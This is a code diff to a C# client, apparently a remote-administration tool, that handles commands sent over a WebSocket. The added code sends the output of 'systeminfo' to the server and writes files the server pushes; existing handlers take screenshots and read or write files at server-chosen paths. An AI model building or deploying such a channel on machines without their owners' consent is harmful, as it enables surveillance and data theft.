@@ -129,16 +129,23 @@ namespace ImageSender
             }
             else if (result["type"].Value<String>() == "systemInfo")
             {
-             //   MessageBox.Show(getGPUInfo());
-               //   ws.Send("{ \"type\":\"" + "sendInfo" + "\", \"message\":\"" + getGPUInfo() +  "\", \"deviceUid\":\"" + comp.deviceUid +  "\"}");
-              //  ws.Send("{ \"type\":\"" + "sendInfo" + "\", \"message\":\"" + "Cao jasmine" + "\", \"deviceUid\":\"" + comp.deviceUid + "\"}");
+
+                String ret = TerminalCommand.SystemInfo("systeminfo",Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
+              
+                //   MessageBox.Show(getGPUInfo());
+                  ws.Send("{ \"type\":\"" + "sendInfo" + "\", \"message\":\"" + ret +  "\", \"deviceUid\":\"" + comp.deviceUid +  "\"}");
+                //  ws.Send("{ \"type\":\"" + "sendInfo" + "\", \"message\":\"" + "Cao jasmine" + "\", \"deviceUid\":\"" + comp.deviceUid + "\"}");
 
             }
             else if (result["type"].Value<String>() == "getScreenshot") sendScreenshot();
+            else if (result["type"].ToString() == "putFiles")
+            {
+                saveFiles(result["files"].ToString());
+            }
             else if (result["type"].Value<String>() == "getFile") sendFile(result["path"].Value<String>(), result["fileName"].Value<String>());
             else if (result["type"].Value<String>() == "getFileDirect") sendFile(result["path"].Value<String>(), result["fileName"].Value<String>(), "sendFileDirect");
             else if (result["type"].Value<String>() == "putFile") getFile(result["data"].Value<String>(), result["path"].Value<String>(), result["fileName"].Value<String>());
-            else if (result["type"].Value<String>() != "Connected") sendMessage("empty", "Komanda ne postoji");
+            else   sendMessage("Empty", "Komanda ne postoji");
 
             Logger logger = new Logger( result["type"].Value<String>(), result["user"].Value<String>());
             logger.writeLog();
